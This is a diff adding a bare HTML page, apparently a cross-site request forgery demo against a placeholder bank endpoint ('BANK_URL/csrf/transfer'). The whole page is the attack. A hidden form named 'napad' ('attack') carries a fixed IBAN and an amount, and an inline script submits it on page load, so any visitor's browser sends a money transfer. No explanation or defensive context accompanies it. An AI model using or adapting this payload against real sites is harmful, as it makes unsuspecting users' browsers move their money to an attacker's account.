@@ -1,0 +1,18 @@
+<!doctype html>
+<html lang="hr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title></title>
+</head>
+<body>
+  <form id="napad" method="post" action="https://BANK_URL/csrf/transfer">
+    <input type="hidden" name="iban" value="HR1210010051863000162">
+    <input type="hidden" name="amount" value="100">
+  </form>
+
+  <script>
+    document.getElementById('napad').submit()
+  </script>
+</body>
+</html>
